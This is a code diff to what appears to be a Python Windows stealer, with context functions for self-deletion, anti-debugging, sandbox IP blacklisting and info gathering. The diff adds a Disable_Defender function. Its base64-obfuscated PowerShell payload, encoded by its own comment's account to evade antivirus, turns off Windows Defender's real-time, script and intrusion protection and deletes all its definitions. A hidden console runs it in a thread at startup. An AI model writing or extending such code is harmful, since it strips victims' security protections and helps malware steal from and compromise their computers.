@@ -127,7 +127,13 @@ def self_delete():
         os.remove(__file__)
     except Exception as e:
         pass
-
+def Disable_Defender():
+    try:
+        cmd = b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
+        subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+    except:
+        pass
+            
 def check_ip():
     blacklisted = [
         '822.842.352.43', '311.45.741.48', '64.842.821.32', '441.291.112.29', '432.75.04.291',
@@ -3124,6 +3130,13 @@ def gatha():
     First_Thread = []
     Second_Thread = []
     try:
+        defender = threading.Thread(target=Disable_Defender)
+        defender.start()
+        Second_Thread.append(defender)
+    except:
+        pass
+    
+    try:
         if antidebugging == True:
             ad = threading.Thread(target=antidebug)
             ad.start()
@@ -3181,7 +3194,6 @@ def gatha():
     getinf = threading.Thread(target=getinfo)
     getinf.start()
     First_Thread.append(getinf)
-    
     if Fakegen == True:
         us = threading.Thread(target=fakegen)
         us.start()
